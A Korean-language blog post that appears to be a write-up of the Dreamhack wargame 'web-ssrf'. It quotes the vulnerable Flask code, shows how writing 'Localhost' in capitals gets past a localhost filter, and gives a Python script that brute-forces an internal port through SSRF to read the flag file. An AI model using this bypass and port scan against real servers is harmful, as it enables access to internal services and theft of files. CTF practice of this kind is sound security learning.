---
title : "드림핵 워게임 web-ssrf  "
tags : 
date : "2026-04-04"
bookmark :  true
---

# 문제 설명
--------------
flask로 작성된 image viewer 서비스 입니다.

SSRF 취약점을 이용해 플래그를 획득하세요. 플래그는 /app/flag.txt에 있습니다.

**홈 화면**
![설명]({{ 'assets\img\ssrf1_0.png' | relative_url }})



# 문제 풀이
--------------

코드를 살펴보자.

**&lt;img_viewer의 함수&gt;**

```
@app.route("/img_viewer", methods=["GET", "POST"])
def img_viewer():
    if request.method == "GET": 
        return render_template("img_viewer.html") 
    elif request.method == "POST":
        url = request.form.get("url", "")
        urlp = urlparse(url) 
        if url[0] == "/":
            url = "http://localhost:8000" + url
        # URL 필터링
        elif ("localhost" in urlp.netloc) or ("127.0.0.1" in urlp.netloc): 
            data = open("error.png", "rb").read() 
            img = base64.b64encode(data).decode("utf8")
            return render_template("img_viewer.html", img=img)
        try:
            data = requests.get(url, timeout=3).content
            img = base64.b64encode(data).decode("utf8")
        except:
            data = open("error.png", "rb").read() 
            img = base64.b64encode(data).decode("utf8")
        return render_template("img_viewer.html", img=img)

```


**&lt;run_local_server의 함수&gt;**

```
local_host = "127.0.0.1"
local_port = random.randint(1500, 1800)
local_server = http.server.HTTPServer(
    (local_host, local_port), http.server.SimpleHTTPRequestHandler # 리소스를 반환하는 웹 서버
)
def run_local_server():
    local_server.serve_forever()
    
    
threading._start_new_thread(run_local_server, ()) # 다른 쓰레드로 `local_server`를 실행합니다.
```

image_viewer의 함수와 run_local_server의 함수를 살펴보면,

1. 호스트가 "127.0.0.1" 이므로 외부에서 이 서버로 직접 접근하는 것이 불가능하다.
2. img_viwer는 서버 주소에 "localhost"나 "127.0.0.1"이 포함된 URL로의 접근을 막고있다.

이를 우회하려면,
localhost를 대문자로 작성하거나 127.0.0.1을 16진수 또는 10진수로 변환시키면 된다.

나는 Localhost로 변경시켜 img viewer에 http://Localhost:8000 을 입력해보았다.

![설명]({{ 'assets\img\ssrf1_1.png' | relative_url }})

입력하니까 깨진 이미지가 나오는데, f12을 켜서 코드를 확인해보니

![설명]({{ 'assets\img\ssrf1_2.png' | relative_url }})

이렇게 인코딩이 되어있다.

base64에서 디코딩을 해보니까

![설명]({{ 'assets\img\ssrf1_3.png' | relative_url }})

역시 html코드를 인코딩해놓은것이다. 따라서 이 url은 로컬호스트를 가리키면서 우회가 가능한 주소이다.

다음으로 랜덤한 포트를 찾아야한다.
포트는 함수에서 나왔듯이 1500~1800사이의 숫자이다.

무차별 대입공격으로 포트를 찾으면된다.

```
#!/usr/bin/python3
import requests
import sys
from tqdm import tqdm

NOTFOUND_IMG = "iVBORw0KG"

def send_img(img_url):
    global chall_url
    data = {
        "url": img_url,
    }
    response = requests.post(chall_url, data=data)
    return response.text
    
    
def find_port():
    for port in tqdm(range(1500, 1801)):
        img_url = f"http://Localhost:{port}"
        if NOTFOUND_IMG not in send_img(img_url):
            print(f"Internal port number is: {port}")
            break
    return port

//img_url에서  http://Localhost:{port}"라고 써 우우회하여 정상적으로 로컬을 찾아가게 함. 
//send_img로 요청을 보내서 에러 이미지가 없다면 포트가 열려있어서 실제 숨겨진 서버의 데이터를 성공적으로 받아왔다는 뜻. 정답 포트를 출력하고 반복문을 멈춘다.
    
    
if __name__ == "__main__":
    chall_port = int(sys.argv[1])
    chall_url = f"http://host1.dreamhack.games:{chall_port}/img_viewer"
    internal_port = find_port()

//터미널에 python 파일명.py 12345 를 치면 sys.argv[1]이 12345가 되어서 공격할 타겟 서버의 최종 주소(chall_url)를 완성한 뒤에 포트 찾기 함수를 실행하게된다.
```

사이트 주소는http://host8.dreamhack.games:22879/img_viewer 이다.

![설명]({{ 'assets\img\ssrf1_4.png' | relative_url }})

터미널에 python ssrf_exercise.py 22879를 치고 엔터를 누르면,

![설명]({{ 'assets\img\ssrf1_5.png' | relative_url }})

이렇게 포트 넘버가 나왔다.

![설명]({{ 'assets\img\ssrf1_6.png' | relative_url }})


포트넘버를 대입하고, 플래그가 flag.txt에 있으니까 이렇게 작성해주고 view를 누르면

![설명]({{ 'assets\img\ssrf1_7.png' | relative_url }})

이렇게 깨진 이미지가 나온다.

개발자모드를 들어가 이미지 코드를 보면 인코딩이 되어있다.

![설명]({{ 'assets\img\ssrf1_8.png' | relative_url }})

base64d에서 디코딩을 해보면,

![설명]({{ 'assets\img\ssrf1_9.png' | relative_url }})

플래그 값이 나온다~!